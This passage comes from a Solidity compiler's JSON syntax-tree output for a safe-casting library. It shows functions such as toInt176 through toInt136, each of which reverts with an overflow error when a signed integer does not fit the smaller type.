Statement","src":"22694:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4855,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4853,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4844,"src":"22734:10:7","typeDescriptions":{"typeIdentifier":"t_int176","typeString":"int176"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4854,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4841,"src":"22748:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"22734:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4862,"nodeType":"IfStatement","src":"22730:98:7","trueBody":{"id":4861,"nodeType":"Block","src":"22755:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313736","id":4857,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22806:3:7","typeDescriptions":{"typeIdentifier":"t_rational_176_by_1","typeString":"int_const 176"},"value":"176"},{"id":4858,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4841,"src":"22811:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_176_by_1","typeString":"int_const 176"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4856,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"22776:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4859,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"22776:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4860,"nodeType":"RevertStatement","src":"22769:48:7"}]}}]},"documentation":{"id":4839,"nodeType":"StructuredDocumentation","src":"22293:312:7","text":" @dev Returns the downcasted int176 from int256, reverting on\n overflow (when the input is less than smallest int176 or\n greater than largest int176).\n Counterpart to Solidity's `int176` operator.\n Requirements:\n - input must fit into 176 bits"},"id":4864,"implemented":true,"kind":"function","modifiers":[],"name":"toInt176","nameLocation":"22619:8:7","nodeType":"FunctionDefinition","parameters":{"id":4842,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4841,"mutability":"mutable","name":"value","nameLocation":"22635:5:7","nodeType":"VariableDeclaration","scope":4864,"src":"22628:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4840,"name":"int256","nodeType":"ElementaryTypeName","src":"22628:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"22627:14:7"},"returnParameters":{"id":4845,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4844,"mutability":"mutable","name":"downcasted","nameLocation":"22672:10:7","nodeType":"VariableDeclaration","scope":4864,"src":"22665:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int176","typeString":"int176"},"typeName":{"id":4843,"name":"int176","nodeType":"ElementaryTypeName","src":"22665:6:7","typeDescriptions":{"typeIdentifier":"t_int176","typeString":"int176"}},"visibility":"internal"}],"src":"22664:19:7"},"scope":5451,"src":"22610:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4889,"nodeType":"Block","src":"23231:150:7","statements":[{"expression":{"id":4877,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4872,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4870,"src":"23241:10:7","typeDescriptions":{"typeIdentifier":"t_int168","typeString":"int168"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4875,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4867,"src":"23261:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4874,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"23254:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int168_$","typeString":"type(int168)"},"typeName":{"id":4873,"name":"int168","nodeType":"ElementaryTypeName","src":"23254:6:7","typeDescriptions":{}}},"id":4876,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"23254:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int168","typeString":"int168"}},"src":"23241:26:7","typeDescriptions":{"typeIdentifier":"t_int168","typeString":"int168"}},"id":4878,"nodeType":"ExpressionStatement","src":"23241:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4881,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4879,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4870,"src":"23281:10:7","typeDescriptions":{"typeIdentifier":"t_int168","typeString":"int168"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4880,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4867,"src":"23295:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"23281:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4888,"nodeType":"IfStatement","src":"23277:98:7","trueBody":{"id":4887,"nodeType":"Block","src":"23302:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313638","id":4883,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"23353:3:7","typeDescriptions":{"typeIdentifier":"t_rational_168_by_1","typeString":"int_const 168"},"value":"168"},{"id":4884,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4867,"src":"23358:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_168_by_1","typeString":"int_const 168"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4882,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"23323:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4885,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"23323:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4886,"nodeType":"RevertStatement","src":"23316:48:7"}]}}]},"documentation":{"id":4865,"nodeType":"StructuredDocumentation","src":"22840:312:7","text":" @dev Returns the downcasted int168 from int256, reverting on\n overflow (when the input is less than smallest int168 or\n greater than largest int168).\n Counterpart to Solidity's `int168` operator.\n Requirements:\n - input must fit into 168 bits"},"id":4890,"implemented":true,"kind":"function","modifiers":[],"name":"toInt168","nameLocation":"23166:8:7","nodeType":"FunctionDefinition","parameters":{"id":4868,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4867,"mutability":"mutable","name":"value","nameLocation":"23182:5:7","nodeType":"VariableDeclaration","scope":4890,"src":"23175:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4866,"name":"int256","nodeType":"ElementaryTypeName","src":"23175:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"23174:14:7"},"returnParameters":{"id":4871,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4870,"mutability":"mutable","name":"downcasted","nameLocation":"23219:10:7","nodeType":"VariableDeclaration","scope":4890,"src":"23212:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int168","typeString":"int168"},"typeName":{"id":4869,"name":"int168","nodeType":"ElementaryTypeName","src":"23212:6:7","typeDescriptions":{"typeIdentifier":"t_int168","typeString":"int168"}},"visibility":"internal"}],"src":"23211:19:7"},"scope":5451,"src":"23157:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4915,"nodeType":"Block","src":"23778:150:7","statements":[{"expression":{"id":4903,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4898,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4896,"src":"23788:10:7","typeDescriptions":{"typeIdentifier":"t_int160","typeString":"int160"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4901,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4893,"src":"23808:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4900,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"23801:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int160_$","typeString":"type(int160)"},"typeName":{"id":4899,"name":"int160","nodeType":"ElementaryTypeName","src":"23801:6:7","typeDescriptions":{}}},"id":4902,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"23801:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int160","typeString":"int160"}},"src":"23788:26:7","typeDescriptions":{"typeIdentifier":"t_int160","typeString":"int160"}},"id":4904,"nodeType":"ExpressionStatement","src":"23788:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4907,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4905,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4896,"src":"23828:10:7","typeDescriptions":{"typeIdentifier":"t_int160","typeString":"int160"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4906,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4893,"src":"23842:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"23828:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4914,"nodeType":"IfStatement","src":"23824:98:7","trueBody":{"id":4913,"nodeType":"Block","src":"23849:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313630","id":4909,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"23900:3:7","typeDescriptions":{"typeIdentifier":"t_rational_160_by_1","typeString":"int_const 160"},"value":"160"},{"id":4910,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4893,"src":"23905:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_160_by_1","typeString":"int_const 160"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4908,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"23870:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4911,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"23870:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4912,"nodeType":"RevertStatement","src":"23863:48:7"}]}}]},"documentation":{"id":4891,"nodeType":"StructuredDocumentation","src":"23387:312:7","text":" @dev Returns the downcasted int160 from int256, reverting on\n overflow (when the input is less than smallest int160 or\n greater than largest int160).\n Counterpart to Solidity's `int160` operator.\n Requirements:\n - input must fit into 160 bits"},"id":4916,"implemented":true,"kind":"function","modifiers":[],"name":"toInt160","nameLocation":"23713:8:7","nodeType":"FunctionDefinition","parameters":{"id":4894,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4893,"mutability":"mutable","name":"value","nameLocation":"23729:5:7","nodeType":"VariableDeclaration","scope":4916,"src":"23722:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4892,"name":"int256","nodeType":"ElementaryTypeName","src":"23722:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"23721:14:7"},"returnParameters":{"id":4897,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4896,"mutability":"mutable","name":"downcasted","nameLocation":"23766:10:7","nodeType":"VariableDeclaration","scope":4916,"src":"23759:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int160","typeString":"int160"},"typeName":{"id":4895,"name":"int160","nodeType":"ElementaryTypeName","src":"23759:6:7","typeDescriptions":{"typeIdentifier":"t_int160","typeString":"int160"}},"visibility":"internal"}],"src":"23758:19:7"},"scope":5451,"src":"23704:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4941,"nodeType":"Block","src":"24325:150:7","statements":[{"expression":{"id":4929,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4924,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4922,"src":"24335:10:7","typeDescriptions":{"typeIdentifier":"t_int152","typeString":"int152"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4927,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4919,"src":"24355:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4926,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"24348:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int152_$","typeString":"type(int152)"},"typeName":{"id":4925,"name":"int152","nodeType":"ElementaryTypeName","src":"24348:6:7","typeDescriptions":{}}},"id":4928,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"24348:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int152","typeString":"int152"}},"src":"24335:26:7","typeDescriptions":{"typeIdentifier":"t_int152","typeString":"int152"}},"id":4930,"nodeType":"ExpressionStatement","src":"24335:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4933,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4931,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4922,"src":"24375:10:7","typeDescriptions":{"typeIdentifier":"t_int152","typeString":"int152"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4932,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4919,"src":"24389:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"24375:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4940,"nodeType":"IfStatement","src":"24371:98:7","trueBody":{"id":4939,"nodeType":"Block","src":"24396:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313532","id":4935,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"24447:3:7","typeDescriptions":{"typeIdentifier":"t_rational_152_by_1","typeString":"int_const 152"},"value":"152"},{"id":4936,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4919,"src":"24452:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_152_by_1","typeString":"int_const 152"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4934,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"24417:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4937,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"24417:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4938,"nodeType":"RevertStatement","src":"24410:48:7"}]}}]},"documentation":{"id":4917,"nodeType":"StructuredDocumentation","src":"23934:312:7","text":" @dev Returns the downcasted int152 from int256, reverting on\n overflow (when the input is less than smallest int152 or\n greater than largest int152).\n Counterpart to Solidity's `int152` operator.\n Requirements:\n - input must fit into 152 bits"},"id":4942,"implemented":true,"kind":"function","modifiers":[],"name":"toInt152","nameLocation":"24260:8:7","nodeType":"FunctionDefinition","parameters":{"id":4920,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4919,"mutability":"mutable","name":"value","nameLocation":"24276:5:7","nodeType":"VariableDeclaration","scope":4942,"src":"24269:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4918,"name":"int256","nodeType":"ElementaryTypeName","src":"24269:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"24268:14:7"},"returnParameters":{"id":4923,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4922,"mutability":"mutable","name":"downcasted","nameLocation":"24313:10:7","nodeType":"VariableDeclaration","scope":4942,"src":"24306:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int152","typeString":"int152"},"typeName":{"id":4921,"name":"int152","nodeType":"ElementaryTypeName","src":"24306:6:7","typeDescriptions":{"typeIdentifier":"t_int152","typeString":"int152"}},"visibility":"internal"}],"src":"24305:19:7"},"scope":5451,"src":"24251:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4967,"nodeType":"Block","src":"24872:150:7","statements":[{"expression":{"id":4955,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4950,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4948,"src":"24882:10:7","typeDescriptions":{"typeIdentifier":"t_int144","typeString":"int144"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4953,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4945,"src":"24902:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4952,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"24895:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int144_$","typeString":"type(int144)"},"typeName":{"id":4951,"name":"int144","nodeType":"ElementaryTypeName","src":"24895:6:7","typeDescriptions":{}}},"id":4954,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"24895:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int144","typeString":"int144"}},"src":"24882:26:7","typeDescriptions":{"typeIdentifier":"t_int144","typeString":"int144"}},"id":4956,"nodeType":"ExpressionStatement","src":"24882:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4959,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4957,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4948,"src":"24922:10:7","typeDescriptions":{"typeIdentifier":"t_int144","typeString":"int144"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4958,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4945,"src":"24936:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"24922:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4966,"nodeType":"IfStatement","src":"24918:98:7","trueBody":{"id":4965,"nodeType":"Block","src":"24943:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313434","id":4961,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"24994:3:7","typeDescriptions":{"typeIdentifier":"t_rational_144_by_1","typeString":"int_const 144"},"value":"144"},{"id":4962,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4945,"src":"24999:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_144_by_1","typeString":"int_const 144"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4960,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"24964:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4963,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"24964:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4964,"nodeType":"RevertStatement","src":"24957:48:7"}]}}]},"documentation":{"id":4943,"nodeType":"StructuredDocumentation","src":"24481:312:7","text":" @dev Returns the downcasted int144 from int256, reverting on\n overflow (when the input is less than smallest int144 or\n greater than largest int144).\n Counterpart to Solidity's `int144` operator.\n Requirements:\n - input must fit into 144 bits"},"id":4968,"implemented":true,"kind":"function","modifiers":[],"name":"toInt144","nameLocation":"24807:8:7","nodeType":"FunctionDefinition","parameters":{"id":4946,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4945,"mutability":"mutable","name":"value","nameLocation":"24823:5:7","nodeType":"VariableDeclaration","scope":4968,"src":"24816:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4944,"name":"int256","nodeType":"ElementaryTypeName","src":"24816:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"24815:14:7"},"returnParameters":{"id":4949,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4948,"mutability":"mutable","name":"downcasted","nameLocation":"24860:10:7","nodeType":"VariableDeclaration","scope":4968,"src":"24853:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int144","typeString":"int144"},"typeName":{"id":4947,"name":"int144","nodeType":"ElementaryTypeName","src":"24853:6:7","typeDescriptions":{"typeIdentifier":"t_int144","typeString":"int144"}},"visibility":"internal"}],"src":"24852:19:7"},"scope":5451,"src":"24798:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4993,"nodeType":"Block","src":"25419:150:7","statements":[{"expression":{"id":4981,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4976,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4974,"src":"25429:10:7","typeDescriptions":{"typeIdentifier":"t_int136","typeString":"int136"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4979,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4971,"src":"25449:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4978,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"25442:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int136_$","typeString":"type(int136)"},"typeName":{"id":4977,"name":"int136","nodeType":"ElementaryTypeName","src":"25442:6:7","typeDescriptions":{}}},"id":4980,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"25442:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int136","typeString":"int136"}},"src":"25429:26:7","typeDescriptions":{"typeIdentifier":"t_int136","typeString":"int136"}},"id":4982,"nodeType":"ExpressionStatement","src":"25429:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4985,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4983,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4974,"src":"25469:10:7","typeDescriptions":{"typeIdentifier":"t_int136","typeString":"int136"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4984,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4971,"src":"25483:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"25469:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4992,"nodeType":"IfStatement","src":"25465:98:7","trueBody":{"id":4991,"nodeType":"Block","src":"25490:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313336","id":4987,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"25541:3:7","typeDescriptions":{"typeIdentifier":"t_rational_136_by_1","typeString":"int_const 136"},"value":"136"},{"id":4988,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4971,"src":"25546:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_136_by_1","typeString":"int_const 136"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4986,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"25511:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4989,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"25511:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4990,"nodeType":"RevertStatement","src":"25504:48:7"}]}}]},"documentation":{"id":4969,"nodeType":"StructuredDocumentation","src":"25028:312:7","text":" @dev Returns the downcasted int136 from int256, reverting on\n overflow (when the input is less than smallest int136 or\n greater than largest int136).\n Counterpart to Solidity's `int136` operator.\n Requirements:\n - input must fit into 136 bits"},"id":4994,"implemented":true,"kind":"function","modifiers":[],"name":"toInt136","nameLocation":"25354:8:7","nodeType":"FunctionDefinition","parameters":{"id":4972,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4971,"mutability":"mutable","name":"value","nameLocation":"25370:5:7","nodeType":"VariableDeclaration","scope":4994,"src":"25363:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4970,"name":"int256","nodeType":"ElementaryTypeName","src":"25363:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"25362:14:7"},"returnParameters":{"id":4975,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4974,"mutability":"mutable","name":"downcasted","nameLocation":"25407:10:7","nodeType":"VariableDeclaration","scope":4994,"src":"25400:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int136","typeString":"int136"},"typeName":{"id":4973,"name":"int136","nodeType":"ElementaryTypeName","src":"25400:6:7","typeDescriptions":{"typeIdentifier":"t_int136","typeString":"int136"}},"visibility":"internal"}],"src":"25399:19:7"},"scope":5451,"src":"25345:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5019,"nodeType":"Block","src":"25966:150:7","statements":[{"expression":{"id":5007,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5002,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5000,"src":"25976:10:7","typeDescriptions":{"typeIdentifier":"t_int128","typeString":"int128"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5005,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4997,"src":"25996:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5004,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"25989:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int128_$","typeString":"type(int128)"},"typeName":{"id":5003,"name":"int128","nodeType":"ElementaryTypeName","src":"25989:6:7","typeDescriptions":{}}},"id":5006,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLo